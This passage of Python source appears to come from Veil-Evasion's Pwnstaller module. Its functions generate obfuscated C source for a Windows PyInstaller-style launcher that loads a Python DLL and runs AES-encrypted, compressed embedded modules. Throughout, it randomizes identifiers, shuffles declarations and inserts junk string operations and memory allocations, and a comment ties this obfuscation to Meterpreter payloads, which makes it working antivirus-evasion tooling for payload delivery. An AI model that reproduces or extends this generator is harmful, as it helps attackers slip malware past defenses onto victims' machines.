    code = "#include \"launch.h\"\n"
    code += "void init_launcher(void);\n"
    code += "int get_thisfile(char *%s, const char *%s);\n" %(helpers.randomString(), helpers.randomString())
    code += "int CreateActContext(char *%s, char *%s);\n" %(helpers.randomString(), helpers.randomString())
    code += "void ReleaseActContext(void);\n"
    code += "int get_thisfilew(LPWSTR %s);\n" %(helpers.randomString())
    code += "void get_homepath(char *%s, const char *%s);\n" %(helpers.randomString(), helpers.randomString())
    code += "void get_archivefile(char *%s, const char *%s);\n" %(helpers.randomString(),helpers.randomString())
    code += "int set_environment(const ARCHIVE_STATUS *%s);\n" %(helpers.randomString())
    code += "int spawn(LPWSTR %s);\n" %(helpers.randomString())

    
    # replace all method names with their randomized choices from the passed list
    for m in methodSubs: code = code.replace(m[0], m[1])

    return code


def pwnstallerGenerateMain():
    """
    Generate an obfuscated version of Pwnstaller's main.c
    """
    allincludes = "#include \"utils.h\"\n"
    
    # TODO: implement call-chain obfuscation here and in launch.c

    status_listName = helpers.randomString()
    thisfileName = helpers.randomString()
    thisfilewName = helpers.randomString()
    homepathName = helpers.randomString()
    archivefileName = helpers.randomString()
    extractionpathName = helpers.randomString()
    rcName = helpers.randomString()

    # same obsfuscation as used in Veil-Evasion's c/meterpreter/* payloads

    # max length string for obfuscation
    global_max_string_length = 10000
    max_string_length = random.randint(100,global_max_string_length)
    max_num_strings = 10000
    
    # TODO: add in more string processing functions
    randName1 = helpers.randomString() # reverse()
    randName2 = helpers.randomString() # doubles characters
    stringModFunctions = [  (randName1, "char* %s(const char *t) { int length= strlen(t); int i; char* t2 = (char*)malloc((length+1) * sizeof(char)); for(i=0;i<length;i++) { t2[(length-1)-i]=t[i]; } t2[length] = '\\0'; return t2; }" %(randName1)), 
                            (randName2, "char* %s(char* s){ char *result =  malloc(strlen(s)*2+1); int i; for (i=0; i<strlen(s)*2+1; i++){ result[i] = s[i/2]; result[i+1]=s[i/2];} result[i] = '\\0'; return result; }" %(randName2))
                         ]
                        
    random.shuffle(stringModFunctions)

    # obfuscation "logical nop" string generation functions
    randString1 = helpers.randomString(50)
    randName1 = helpers.randomString()
    randVar1 = helpers.randomString()
    randName2 = helpers.randomString()
    randVar2 = helpers.randomString()
    randVar3 = helpers.randomString()
    randName3 = helpers.randomString()
    randVar4 = helpers.randomString()
    randVar5 = helpers.randomString()

    # obfuscation char arrays
    char_array_name_1 = helpers.randomString()
    number_of_strings_1 = random.randint(1,max_num_strings)
    char_array_name_2 = helpers.randomString()
    number_of_strings_2 = random.randint(1,max_num_strings)
    char_array_name_3 = helpers.randomString()
    number_of_strings_3 = random.randint(1,max_num_strings)

    # more obfuscation
    stringGenFunctions = [  (randName1, "char* %s(){ char *%s = %s(\"%s\"); return strstr( %s, \"%s\" );}" %(randName1, randVar1, stringModFunctions[0][0], randString1, randVar1, randString1[len(randString1)/2])),
                            (randName2, "char* %s(){ char %s[%s], %s[%s/2]; strcpy(%s,\"%s\"); strcpy(%s,\"%s\"); return %s(strcat( %s, %s)); }" % (randName2, randVar2, max_string_length, randVar3, max_string_length, randVar2, helpers.randomString(50), randVar3, helpers.randomString(50), stringModFunctions[1][0], randVar2, randVar3)),
                            (randName3, "char* %s() { char %s[%s] = \"%s\"; char *%s = strupr(%s); return strlwr(%s); }" % (randName3, randVar4, max_string_length, helpers.randomString(50), randVar5, randVar4, randVar5))
                         ]
    random.shuffle(stringGenFunctions)

    code = stringModFunctions[0][1] + "\n"
    code += stringModFunctions[1][1] + "\n"

    # string "logical nop" functions
    code += stringGenFunctions[0][1] + "\n"
    code += stringGenFunctions[1][1] + "\n"
    code += stringGenFunctions[2][1] + "\n"

    code += "int APIENTRY WinMain( HINSTANCE %s, HINSTANCE %s, LPSTR %s, int %s ) {\n" % (helpers.randomString(), helpers.randomString(), helpers.randomString(), helpers.randomString(), )
    
    # all of these initialization ran be randomized in order
    # TODO: obfuscate the MEIPASS string?
    initializations = [ "ARCHIVE_STATUS *%s[20];" %(status_listName),
                        "char %s[_MAX_PATH];" %(thisfileName),
                        "WCHAR %s[_MAX_PATH + 1];" %(thisfilewName),
                        "char %s[_MAX_PATH];" %(homepathName),
                        "char %s[_MAX_PATH + 5];" %(archivefileName),
                        "char MEIPASS2[_MAX_PATH + 11] = \"_MEIPASS2=\";",
                        "int %s = 0;" %(rcName),
                        "char *%s = NULL;" %(extractionpathName),
                        "int argc = __argc;",
                        "char* %s[%s];" % (char_array_name_1, number_of_strings_1),
                        "char* %s[%s];" % (char_array_name_2, number_of_strings_2),
                        "char* %s[%s];" % (char_array_name_3, number_of_strings_3),
                        "char **argv = __argv;",
                        "int i = 0;"]
    random.shuffle(initializations)
    code += "\n".join(initializations) + "\n"

    # main body of WinMain()
    code += "memset(&%s, 0, 20 * sizeof(ARCHIVE_STATUS *));\n" %(status_listName)

    # malloc our first string obfuscation array
    code += "for (i = 0;  i < %s;  ++i) %s[i] = malloc (%s);" %(number_of_strings_1, char_array_name_1, random.randint(max_string_length,global_max_string_length)) 

    code += "if ((%s[SELF] = (ARCHIVE_STATUS *) calloc(1, sizeof(ARCHIVE_STATUS))) == NULL){ return -1; }\n" %(status_listName)
    code += "get_thisfile(%s, argv[0]);\n" %(thisfileName)
    code += "get_thisfilew(%s);\n" %(thisfilewName)

    # malloc our second string obfuscation array
    code += "for (i = 0;  i < %s;  ++i) %s[i] = malloc (%s);" %(number_of_strings_2, char_array_name_2, random.randint(max_string_length,global_max_string_length))
    
    code += "get_archivefile(%s, %s);\n" %(archivefileName, thisfileName)
    code += "get_homepath(%s, %s);\n" %(homepathName, thisfileName)

    # malloc our third string obfuscation array
    code += "for (i = 0;  i < %s;  ++i) %s[i] = malloc (%s);" %(number_of_strings_3, char_array_name_3, random.randint(max_string_length,global_max_string_length))
        
    # TODO: obfuscate this string?
    code += "%s = getenv( \"_MEIPASS2\" );\n" %(extractionpathName)
    code += "if (%s && *%s == 0) { %s = NULL; }\n" %(extractionpathName,extractionpathName,extractionpathName)

    code += "if (init(%s[SELF], %s, &%s[strlen(%s)])) {\n" %(status_listName, homepathName, thisfileName, homepathName)
    code += "    if (init(%s[SELF], %s, &%s[strlen(%s)])) { return -1; } }\n" %(status_listName, homepathName, archivefileName, homepathName)
    code += "if (!%s && !needToExtractBinaries(%s)) {\n" %(extractionpathName,status_listName)
    code += "    %s = %s;\n" %(extractionpathName,homepathName)
    code += "    strcat(MEIPASS2, %s);\n" %(homepathName)
    code += "    putenv(MEIPASS2); }\n"

    code += "if (%s) {\n" %(extractionpathName)
    code += "    if (strcmp(%s, %s) != 0) {\n" %(homepathName, extractionpathName)
    code += "        strcpy(%s[SELF]->temppath, %s);\n" %(status_listName, extractionpathName)
    code += "        strcpy(%s[SELF]->temppathraw, %s); }\n" %(status_listName, extractionpathName)
    code += "    CreateActContext(%s, %s);\n" %(extractionpathName, thisfileName)
    
    # first string obfuscation method
    code += "for (i=0; i<%s; ++i){strcpy(%s[i], %s());}" %(number_of_strings_1, char_array_name_1, stringGenFunctions[0][0])

    code += "    %s = doIt(%s[SELF], argc, argv);\n" %(rcName, status_listName)
    code += "    ReleaseActContext();\n"
    code += "    finalizePython();\n"
    code += "} else { \n"

    code += "    if (extractBinaries(%s)) { return -1; }\n" %(status_listName)
    
    # second string obfuscation method
    code += "for (i=0; i<%s; ++i){strcpy(%s[i], %s());}" %(number_of_strings_2, char_array_name_2, stringGenFunctions[1][0])

    code += "    strcat(MEIPASS2, %s[SELF]->temppath[0] != 0 ? %s[SELF]->temppath : %s);\n" %(status_listName, status_listName, homepathName)
    code += "    putenv(MEIPASS2);\n"
    code += "    if (set_environment(%s[SELF]) == -1) return -1;\n" %(status_listName)
    code += "    %s = spawn(%s);\n" %(rcName, thisfilewName)
    code += "    if (%s[SELF]->temppath[0] != 0) clear(%s[SELF]->temppath);\n" %(status_listName,status_listName)
    code += "    for (i = SELF; %s[i] != NULL; i++) { free(%s[i]); }}\n" %(status_listName, status_listName)
    
    # third string obfuscation method
    code += "for (i=0; i<%s; ++i){strcpy(%s[i], %s());}" %(number_of_strings_3, char_array_name_3, stringGenFunctions[2][0])
        
    code += "return %s; }\n" %(rcName)

    return (allincludes, code)


def pwnstallerGenerateLaunch():

    """
    Generate obfuscated versions of Pwnstaller's launch.c and launch.h

    This is the tough one- ~1600 original lines, trimmed down to a more 
    manageable and necessary ~500 
    """
    allincludes = ""

    # I *think* these imports can be randomized...
    imports = [ "#include <stdio.h>", "#include <windows.h>", "#include <direct.h>", "#include <process.h>",
                "#include <io.h>", "#define unsetenv(x) _putenv(x \"=\")", "#include <sys/types.h>", "#include <sys/stat.h>",
                "#include \"launch.h\"", "#include <string.h>", "#include \"zlib.h\"", "#define snprintf _snprintf", "#define vsnprintf _vsnprintf"]
    random.shuffle(imports)
    allincludes = "\n".join(imports) + "\n"

    # Python Entry point declarations, these can definitely be shuffled
    # removed:  Py_OptimizeFlag, Py_VerboseFlag, PySys_SetArgv, PyFile_FromString, PyObject_CallObject, PySys_AddWarnOption
    #           PyEval_InitThreads, PyEval_AcquireThread, PyEval_ReleaseThread, PyThreadState_Swap, Py_NewInterpreter, PySys_SetObject
    entries = ["DECLVAR(Py_FrozenFlag);","DECLVAR(Py_NoSiteFlag);","DECLPROC(Py_Initialize);","DECLPROC(Py_Finalize);","DECLPROC(Py_IncRef);","DECLPROC(Py_DecRef);","DECLPROC(PyImport_ExecCodeModule);","DECLPROC(PyRun_SimpleString);","DECLPROC(Py_SetProgramName);","DECLPROC(PyImport_ImportModule);","DECLPROC(PyImport_AddModule);","DECLPROC(PyObject_SetAttrString);","DECLPROC(PyList_New);","DECLPROC(PyList_Append);","DECLPROC(Py_BuildValue);","DECLPROC(PyString_FromStringAndSize);","DECLPROC(PyString_AsString);","DECLPROC(PyObject_CallFunction);","DECLPROC(PyModule_GetDict);","DECLPROC(PyDict_GetItemString);","DECLPROC(PyErr_Clear);","DECLPROC(PyErr_Occurred);","DECLPROC(PyErr_Print);","DECLPROC(PyObject_CallMethod);","DECLPROC(PyInt_AsLong);","DECLPROC(PySys_SetObject);"]
    random.shuffle(entries)
    code = "\n".join(entries) + "\n"


    # intial extract() def
    code += "unsigned char *extract(ARCHIVE_STATUS *%s, TOC *%s);\n" %(helpers.randomString(), helpers.randomString())


    # getTempPath()
    buffName = helpers.randomString()
    retName = helpers.randomString()
    prefixName = helpers.randomString()
    code += "int getTempPath(char *%s){\n" %(buffName)
    code += "int i;\n"
    code += "char *%s;\n" %(retName)
    code += "char %s[16];\n" %(prefixName)
    code += "GetTempPath(MAX_PATH, %s);\n" %(buffName)
    # TODO: obfuscate this string?
    code += "sprintf(%s, \"_MEI%%d\", getpid());\n" %(prefixName)
    code += "for (i=0;i<5;i++) {\n"
    code += "    %s = _tempnam(%s, %s);\n" %(retName, buffName, prefixName)
    code += "    if (mkdir(%s) == 0) {\n" %(retName)
    code += "        strcpy(%s, %s); strcat(%s, \"\\\\\");\n" %(buffName, retName, buffName)
    code += "        free(%s); return 1;\n" %(retName)
    code += "    } free(%s);\n" %(retName)
    code += "} return 0; }\n"


    # checkFile()
    bufName = helpers.randomString()
    fmtName = helpers.randomString()
    argsName = helpers.randomString()
    tmpName = helpers.randomString()
    code += "static int checkFile(char *%s, const char *%s, ...){\n" %(bufName, fmtName)
    code += "    va_list %s;\n" %(argsName)
    code += "    struct stat %s;\n" %(tmpName)
    code += "    va_start(%s, %s);\n" %(argsName, fmtName)
    code += "    vsnprintf(%s, _MAX_PATH, %s, %s);\n" %(bufName, fmtName, argsName)
    code += "    va_end(%s);\n" %(argsName)
    code += "    return stat(%s, &%s); }\n" %(bufName, tmpName)


    # setPaths()
    statusName = helpers.randomString()
    archivePathName = helpers.randomString()
    archiveNameName = helpers.randomString()
    pName = helpers.randomString()
    code += "int setPaths(ARCHIVE_STATUS *%s, char const * %s, char const * %s) {\n" %(statusName, archivePathName, archiveNameName)
    code += "    char *%s;\n" %(pName)
    code += "    strcpy(%s->archivename, %s);\n" %(statusName, archivePathName)
    code += "    strcat(%s->archivename, %s);\n" %(statusName, archiveNameName)
    code += "    strcpy(%s->homepath, %s);\n" %(statusName, archivePathName)
    code += "    strcpy(%s->homepathraw, %s);\n" %(statusName, archivePathName)
    code += "    for ( %s = %s->homepath; *%s; %s++ ) if (*%s == '\\\\') *%s = '/';\n" %(pName,statusName,pName,pName,pName,pName)
    code += "    return 0;}\n"


    # checkCookie()
    statusName = helpers.randomString()
    filelenName = helpers.randomString()
    code += "int checkCookie(ARCHIVE_STATUS *%s, int %s) {\n" %(statusName, filelenName)
    code += "    if (fseek(%s->fp, %s-(int)sizeof(COOKIE), SEEK_SET)) return -1;\n" %(statusName, filelenName)
    code += "    if (fread(&(%s->cookie), sizeof(COOKIE), 1, %s->fp) < 1) return -1;\n" %(statusName,statusName)
    code += "    if (strncmp(%s->cookie.magic, MAGIC, strlen(MAGIC))) return -1;\n" %(statusName)
    code += "    return 0;}\n"


    # openArchive()
    statusName = helpers.randomString()
    filelenName = helpers.randomString()
    code += "    int openArchive(ARCHIVE_STATUS *%s){\n" %(statusName)
    code += "        int i; int %s;\n" %(filelenName)
    code += "        %s->fp = fopen(%s->archivename, \"rb\");\n" %(statusName,statusName)
    code += "        if (%s->fp == NULL) { return -1;}\n" %(statusName)
    code += "        fseek(%s->fp, 0, SEEK_END);\n" %(statusName)
    code += "        %s = ftell(%s->fp);\n" %(filelenName, statusName)
    code += "        if (checkCookie(%s, %s) < 0) { return -1;}\n" %(statusName, filelenName)
    code += "        %s->pkgstart = %s - ntohl(%s->cookie.len);\n" %(statusName, filelenName, statusName)
    code += "        fseek(%s->fp, %s->pkgstart + ntohl(%s->cookie.TOC), SEEK_SET);\n" %(statusName,statusName,statusName)
    code += "        %s->tocbuff = (TOC *) malloc(ntohl(%s->cookie.TOClen));\n" %(statusName,statusName)
    code += "        if (%s->tocbuff == NULL){ return -1; }\n" %(statusName)
    code += "        if (fread(%s->tocbuff, ntohl(%s->cookie.TOClen), 1, %s->fp) < 1) { return -1; }\n" %(statusName,statusName,statusName)
    code += "        %s->tocend = (TOC *) (((char *)%s->tocbuff) + ntohl(%s->cookie.TOClen));\n" %(statusName,statusName,statusName)
    code += "        if (ferror(%s->fp)) { return -1; }\n" %(statusName)
    code += "        return 0;}\n"


    # emulated incref/decref
    # NOTE: not sure what can be randomized here...
    code += "        struct _old_typeobject;\n"
    code += "        typedef struct _old_object { int ob_refcnt; struct _old_typeobject *ob_type;} OldPyObject;\n"
    code += "        typedef void (*destructor)(PyObject *);\n"
    code += "        typedef struct _old_typeobject { int ob_refcnt; struct _old_typeobject *ob_type; int ob_size; char *tp_name;\n"
    code += "            int tp_basicsize, tp_itemsize; destructor tp_dealloc; } OldPyTypeObject;\n"
    code += "        static void _EmulatedIncRef(PyObject *o){\n"
    code += "            OldPyObject *oo = (OldPyObject*)o;\n"
    code += "            if (oo) oo->ob_refcnt++;}\n"
    code += "        static void _EmulatedDecRef(PyObject *o){\n"
    code += "            #define _Py_Dealloc(op) (*(op)->ob_type->tp_dealloc)((PyObject *)(op))\n"
    code += "            OldPyObject *oo = (OldPyObject*)o;\n"
    code += "            if (--(oo)->ob_refcnt == 0) _Py_Dealloc(oo);}\n"


    # mapNames()
    dllName = helpers.randomString()
    code += "int mapNames(HMODULE %s, int %s){\n" %(dllName, helpers.randomString())
    # Python Entry point declarations, these can definitely be shuffled
    # removed:  Py_OptimizeFlag, Py_VerboseFlag, PySys_SetArgv, PyFile_FromString, PyObject_CallObject, PySys_AddWarnOption
    #           PyEval_InitThreads, PyEval_AcquireThread, PyEval_ReleaseThread, PyThreadState_Swap, Py_NewInterpreter, PySys_SetObject
    entry_points = ["GETVAR(dll, Py_FrozenFlag);","GETVAR(dll, Py_NoSiteFlag);","GETPROC(dll, Py_Initialize);","GETPROC(dll, Py_Finalize);","GETPROCOPT(dll, Py_IncRef);","GETPROCOPT(dll, Py_DecRef);","GETPROC(dll, PyImport_ExecCodeModule);","GETPROC(dll, PyRun_SimpleString);","GETPROC(dll, PyString_FromStringAndSize);","GETPROC(dll, Py_SetProgramName);","GETPROC(dll, PyImport_ImportModule);","GETPROC(dll, PyImport_AddModule);","GETPROC(dll, PyObject_SetAttrString);","GETPROC(dll, PyList_New);","GETPROC(dll, PyList_Append);","GETPROC(dll, Py_BuildValue);","GETPROC(dll, PyString_AsString);","GETPROC(dll, PyObject_CallFunction);","GETPROC(dll, PyModule_GetDict);","GETPROC(dll, PyDict_GetItemString);","GETPROC(dll, PyErr_Clear);","GETPROC(dll, PyErr_Occurred);","GETPROC(dll, PyErr_Print);","GETPROC(dll, PyObject_CallMethod);","GETPROC(dll, PyInt_AsLong);"]
    entry_points = [x.replace("dll", dllName) for x in entry_points]
    random.shuffle(entry_points)
    code += "\n".join(entry_points) + "\n"

    code += "    if (!PI_Py_IncRef) PI_Py_IncRef = _EmulatedIncRef;\n"
    code += "    if (!PI_Py_DecRef) PI_Py_DecRef = _EmulatedDecRef;\n"
    code += "    return 0;}\n"


    # loadPython()
    statusName = helpers.randomString()
    dllPathName = helpers.randomString()
    dllName = helpers.randomString()
    pyversName = helpers.randomString()
    code += "int loadPython(ARCHIVE_STATUS *%s){\n" %(statusName)
    code += "    HINSTANCE %s;\n" %(dllName)
    code += "    char %s[_MAX_PATH + 1];\n" %(dllPathName)
    code += "    int %s = ntohl(%s->cookie.pyvers);\n" %(pyversName, statusName)
    # TODO: obfuscate this string?
    code += "    sprintf(%s, \"%%spython%%02d.dll\", %s->homepathraw, %s);\n" %(dllPathName,statusName,pyversName)
    code += "    %s = LoadLibraryExA(%s, NULL, LOAD_WITH_ALTERED_SEARCH_PATH);\n" %(dllName, dllPathName)
    # TODO: obfuscate this string?
    code += "    if (!%s) {sprintf(%s, \"%%spython%%02d.dll\", %s->temppathraw, %s);\n" %(dllName, dllPathName,statusName,pyversName)
    code += "        %s = LoadLibraryExA(%s, NULL, LOAD_WITH_ALTERED_SEARCH_PATH );}\n" %(dllName, dllPathName)
    code += "    if (%s == 0) { return -1; }\n" %(dllName)
    code += "    mapNames(%s, %s);\n" %(dllName,pyversName)
    code += "    return 0;}\n"


    # incrementTocPtr()
    statusName = helpers.randomString()
    ptocName = helpers.randomString()
    resultName = helpers.randomString()
    code += " TOC *incrementTocPtr(ARCHIVE_STATUS *%s, TOC* %s){\n" %(statusName,ptocName)
    code += "     TOC *%s = (TOC*)((char *)%s + ntohl(%s->structlen));\n" %(resultName,ptocName,ptocName)
    code += "     if (%s < %s->tocbuff) { return %s->tocend; }\n" %(resultName,statusName,statusName)
    code += "     return %s;}\n" %(resultName)


    # startPython()
    statusName = helpers.randomString()
    pypathName = helpers.randomString()
    py_argvName = helpers.randomString()
    cmdName = helpers.randomString()
    tmpName = helpers.randomString()
    code += "int startPython(ARCHIVE_STATUS *%s, int argc, char *argv[]) {\n" %(statusName)
    code += "static char %s[2*_MAX_PATH + 14];\n" %(pypathName)
    code += "int i;\n"
    code += "char %s[_MAX_PATH+1+80];\n" %(cmdName)
    code += "char %s[_MAX_PATH+1];\n" %(tmpName)
    code += "PyObject *%s;\n" %(py_argvName)
    code += "PyObject *val;\n"
    code += "PyObject *sys;\n"
    # TODO: obfuscate this string?
    code += "strcpy(%s, \"PYTHONPATH=\");\n" %(pypathName)
    code += "if (%s->temppath[0] != '\\0') { strcat(%s, %s->temppath); %s[strlen(%s)-1] = '\\0'; strcat(%s, \";\"); }\n" %(statusName, pypathName, statusName, pypathName, pypathName, pypathName)
    code += "strcat(%s, %s->homepath);\n" %(pypathName, statusName)
    code += "if (strlen(%s) > 14) %s[strlen(%s)-1] = '\\0';\n" %(pypathName, pypathName, pypathName)
    code += "putenv(%s);\n" %(pypathName)
    # TODO: obfuscate this string?
    code += "strcpy(%s, \"PYTHONHOME=\");\n" %(pypathName)
    code += "strcat(%s, %s->temppath);\n" %(pypathName, statusName)
    code += "putenv(%s);\n" %(pypathName)
    code += "*PI_Py_NoSiteFlag = 1; *PI_Py_FrozenFlag = 1;\n"
    # TODO: can we randomize the program name?
    code += "PI_Py_SetProgramName(%s->archivename);\n" %(statusName)
    code += "PI_Py_Initialize();\n"
    # TODO: obfuscate this string?
    code += "PI_PyRun_SimpleString(\"import sys\\n\");\n"
    # TODO: obfuscate this string?
    code += "PI_PyRun_SimpleString(\"del sys.path[:]\\n\");\n"
    code += "if (%s->temppath[0] != '\\0') {\n" %(statusName)
    code += "    strcpy(%s, %s->temppath);\n" %(tmpName, statusName)
    code += "    %s[strlen(%s)-1] = '\\0';\n" %(tmpName, tmpName)
    # TODO: obfuscate this string?
    code += "    sprintf(%s, \"sys.path.append(r\\\"%%s\\\")\", %s);\n" %(cmdName, tmpName)
    code += "    PI_PyRun_SimpleString(%s);}\n" %(cmdName)
    code += "strcpy(%s, %s->homepath);\n" %(tmpName, statusName)
    code += "%s[strlen(%s)-1] = '\\0';\n" %(tmpName, tmpName)
    code += "sprintf(%s, \"sys.path.append(r\\\"%%s\\\")\", %s);\n" %(cmdName, tmpName)
    code += "PI_PyRun_SimpleString (%s);\n" %(cmdName)
    code += "%s = PI_PyList_New(0);\n" %(py_argvName)
    code += "val = PI_Py_BuildValue(\"s\", %s->archivename);\n" %(statusName)
    code += "PI_PyList_Append(%s, val);\n" %(py_argvName)
    code += "for (i = 1; i < argc; ++i) { val = PI_Py_BuildValue (\"s\", argv[i]); PI_PyList_Append (%s, val); }\n" %(py_argvName)
    code += "sys = PI_PyImport_ImportModule(\"sys\");\n"
    code += "PI_PyObject_SetAttrString(sys, \"argv\", %s);\n" %(py_argvName)
    code += "return 0;}\n"


    # importModules() -> problem here, causing a fail
    statusName = helpers.randomString()
    ptocName = helpers.randomString()
    marshaldictName = helpers.randomString()
    marshalName = helpers.randomString()
    loadfuncName = helpers.randomString()
    modbufName = helpers.randomString()
    code += "int importModules(ARCHIVE_STATUS *%s){\n" %(statusName)
    code += "    PyObject *%s; PyObject *%s; PyObject *%s;\n" %(marshalName, marshaldictName, loadfuncName)
    code += "    TOC *%s; PyObject *co; PyObject *mod;\n" %(ptocName)
    # TODO: obfuscate this string?
    code += "    %s = PI_PyImport_ImportModule(\"marshal\");\n" %(marshalName)
    code += "    %s = PI_PyModule_GetDict(%s);\n" %(marshaldictName, marshalName)
    # TODO: obfuscate this string?
    code += "    %s = PI_PyDict_GetItemString(%s, \"loads\");\n" %(loadfuncName, marshaldictName)
    code += "    %s = %s->tocbuff;\n" %(ptocName, statusName)
    code += "    while (%s < %s->tocend) {\n" %(ptocName, statusName)
    code += "        if (%s->typcd == 'm' || %s->typcd == 'M'){\n" %(ptocName, ptocName)
    code += "            unsigned char *%s = extract(%s, %s);\n" %(modbufName, statusName, ptocName)
    code += "            co = PI_PyObject_CallFunction(%s, \"s#\", %s+8, ntohl(%s->ulen)-8);\n" %(loadfuncName, modbufName, ptocName)
    code += "            mod = PI_PyImport_ExecCodeModule(%s->name, co);\n" %(ptocName)
    code += "            if (PI_PyErr_Occurred()) { PI_PyErr_Print(); PI_PyErr_Clear(); }\n"
    code += "            free(%s);\n" %(modbufName)
    code += "        }\n"
    code += "        %s = incrementTocPtr(%s, %s);\n" %(ptocName, statusName, ptocName)
    code += "    } return 0; }\n"


    # installZlib()
    statusName = helpers.randomString()
    ptocName = helpers.randomString()
    zlibposName = helpers.randomString()
    cmdName = helpers.randomString()
    tmplName = helpers.randomString()
    rcName = helpers.randomString()
    code += "int installZlib(ARCHIVE_STATUS *%s, TOC *%s){\n" %(statusName, ptocName)
    code += "    int %s; int %s = %s->pkgstart + ntohl(%s->pos);\n" %(rcName, zlibposName, statusName, ptocName)
    # TODO: obfuscate this string?
    code += "    char *%s = \"sys.path.append(r\\\"%%s?%%d\\\")\\n\";\n" %(tmplName)
    code += "    char *%s = (char *) malloc(strlen(%s) + strlen(%s->archivename) + 32);\n" %(cmdName, tmplName, statusName)
    code += "    sprintf(%s, %s, %s->archivename, %s);\n" %(cmdName, tmplName, statusName, zlibposName)
    code += "    %s = PI_PyRun_SimpleString(%s);\n" %(rcName, cmdName)
    code += "    if (%s != 0){ free(%s); return -1; }\n" %(rcName, cmdName)
    code += "    free(%s); return 0;}\n" %(cmdName)


    # installZlibs()
    statusName = helpers.randomString()
    ptocName = helpers.randomString()
    code += "int installZlibs(ARCHIVE_STATUS *%s){\n" %(statusName)
    code += "TOC * %s; %s = %s->tocbuff;\n" %(ptocName, ptocName, statusName)
    code += "while (%s < %s->tocend) {\n" %(ptocName, statusName)
    code += "    if (%s->typcd == 'z') { installZlib(%s, %s); }\n" %(ptocName, statusName, ptocName)
    code += "    %s = incrementTocPtr(%s, %s); }\n" %(ptocName, statusName, ptocName)
    code += "return 0; }\n"


    # decompress()
    buffName = helpers.randomString()
    ptocName = helpers.randomString()
    outName = helpers.randomString()
    zstreamName = helpers.randomString()
    rcName = helpers.randomString()
    code += "unsigned char *decompress(unsigned char * %s, TOC *%s){\n" %(buffName, ptocName)
    code += "unsigned char *%s; z_stream %s; int %s;\n" %(outName, zstreamName, rcName)
    code += "%s = (unsigned char *)malloc(ntohl(%s->ulen));\n" %(outName, ptocName)
    code += "if (%s == NULL) { return NULL; }\n" %(outName)
    code += "%s.zalloc = NULL;\n" %(zstreamName)
    code += "%s.zfree = NULL;\n" %(zstreamName)
    code += "%s.opaque = NULL;\n" %(zstreamName)
    code += "%s.next_in = %s;\n" %(zstreamName, buffName)
    code += "%s.avail_in = ntohl(%s->len);\n" %(zstreamName, ptocName)
    code += "%s.next_out = %s;\n" %(zstreamName, outName)
    code += "%s.avail_out = ntohl(%s->ulen);\n" %(zstreamName, ptocName)
    code += "%s = inflateInit(&%s);\n" %(rcName, zstreamName)
    code += "if (%s >= 0) { \n" %(rcName)
    code += "    %s = (inflate)(&%s, Z_FINISH);\n" %(rcName, zstreamName)
    code += "    if (%s >= 0) { %s = (inflateEnd)(&%s); }\n" %(rcName, rcName, zstreamName)
    code += "    else { return NULL; } }\n"
    code += "else { return NULL; }\n"
    code += "return %s;}\n" %(outName)


    # extract()
    statusName = helpers.randomString()
    ptocName = helpers.randomString()
    dataName = helpers.randomString()
    AESName = helpers.randomString()
    tmpName = helpers.randomString()
    func_newName = helpers.randomString()
    ddataName = helpers.randomString()
    aes_dictName = helpers.randomString()
    aes_objName = helpers.randomString()
    code += "unsigned char *extract(ARCHIVE_STATUS *%s, TOC *%s){\n" %(statusName, ptocName)
    code += "unsigned char *%s;unsigned char *%s;\n" %(dataName, tmpName)
    code += "fseek(%s->fp, %s->pkgstart + ntohl(%s->pos), SEEK_SET);\n" %(statusName, statusName, ptocName)
    code += "%s = (unsigned char *)malloc(ntohl(%s->len));\n" %(dataName, ptocName)
    code += "if (%s == NULL) { return NULL; }\n" %(dataName)
    code += "if (fread(%s, ntohl(%s->len), 1, %s->fp) < 1) { return NULL; }\n" %(dataName, ptocName, statusName)
    code += "if (%s->cflag == '\\2') {\n" %(ptocName)
    code += "    static PyObject *%s = NULL;\n" %(AESName)
    code += "    PyObject *%s; PyObject *%s; PyObject *%s; PyObject *%s;\n" %(func_newName, aes_dictName, aes_objName, ddataName)
    code += "    long block_size; char *iv;\n"
    code += "    if (!%s) %s = PI_PyImport_ImportModule(\"AES\");\n" %(AESName,AESName)
    code += "    %s = PI_PyModule_GetDict(%s);\n" %(aes_dictName, AESName)
    code += "    %s = PI_PyDict_GetItemString(%s, \"new\");\n" %(func_newName, aes_dictName)
    code += "    block_size = PI_PyInt_AsLong(PI_PyDict_GetItemString(%s, \"block_size\"));\n" %(aes_dictName)
    code += "    iv = malloc(block_size);\n"
    code += "    memset(iv, 0, block_size);\n"
    code += "    %s = PI_PyObject_CallFunction(%s, \"s#Os#\", %s, 32, PI_PyDict_GetItemString(%s, \"MODE_CFB\"), iv, block_size);\n" %(aes_objName, func_newName, dataName, aes_dictName)
    code += "    %s = PI_PyObject_CallMethod(%s, \"decrypt\", \"s#\", %s+32, ntohl(%s->len)-32);\n" %(ddataName, aes_objName, dataName, ptocName)
    code += "    memcpy(%s, PI_PyString_AsString(%s), ntohl(%s->len)-32);\n" %(dataName, ddataName, ptocName)
    code += "    Py_DECREF(%s); Py_DECREF(%s);}\n" %(aes_objName, ddataName)
    code += "if (%s->cflag == '\\1' || %s->cflag == '\\2') {\n" %(ptocName, ptocName)
    code += "    %s = decompress(%s, %s);\n" %(tmpName, dataName, ptocName)
    code += "    free(%s); %s = %s;\n" %(dataName, dataName, tmpName)
    code += "    if (%s == NULL) { return NULL; } }\n" %(dataName)
    code += "return %s;}\n" %(dataName)


    # openTarget()
    pathName = helpers.randomString()
    name_Name = helpers.randomString()
    sbufName = helpers.randomString()
    nameName = helpers.randomString()
    fnmName = helpers.randomString()
    dirName = helpers.randomString()
    code += "FILE *openTarget(const char *%s, const char* %s) {\n" %(pathName, name_Name)
    code += "struct stat %s; char %s[_MAX_PATH+1]; char %s[_MAX_PATH+1]; char *%s;\n" %(sbufName, fnmName, nameName, dirName)
    code += "strcpy(%s, %s); strcpy(%s, %s); %s[strlen(%s)-1] = '\\0';\n" %(fnmName, pathName, nameName, name_Name, fnmName, fnmName)
    code += "%s = strtok(%s, \"/\\\\\");\n" %(dirName, nameName)
    code += "while (%s != NULL){\n" %(dirName)
    code += "    strcat(%s, \"\\\\\");\n" %(fnmName)
    code += "    strcat(%s, %s);\n" %(fnmName, dirName)
    code += "    %s = strtok(NULL, \"/\\\\\");\n" %(dirName)
    code += "    if (!%s) break;\n" %(dirName)
    code += "    if (stat(%s, &%s) < 0) {mkdir(%s);} }\n" %(fnmName, sbufName, fnmName)
    code += "return fopen(%s, \"wb\"); }\n" %(fnmName)


    # createTempPath()
    statusName = helpers.randomString()
    pName = helpers.randomString()
